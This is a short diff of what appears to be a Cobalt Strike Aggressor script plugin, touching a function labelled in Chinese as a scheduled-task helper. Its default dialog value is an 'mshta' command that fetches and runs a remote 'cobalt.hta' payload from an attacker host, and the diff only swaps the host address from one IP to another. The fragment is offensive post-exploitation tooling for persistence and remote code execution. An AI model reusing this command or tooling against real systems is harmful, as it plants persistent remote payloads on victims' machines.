@@ -150,7 +150,7 @@ sub registry {
 # 定时任务函数
 sub schtasks {
     $bid = $1;
-    $dialog = dialog("定时任务", %(filePath => "mshta http://118.24.63.73/evil/cobalt.hta"), lambda({
+    $dialog = dialog("定时任务", %(filePath => "mshta http://1.1.1.1/evil/cobalt.hta"), lambda({
         if ($2 eq 'Help'){
             helpschtasks()
             break;
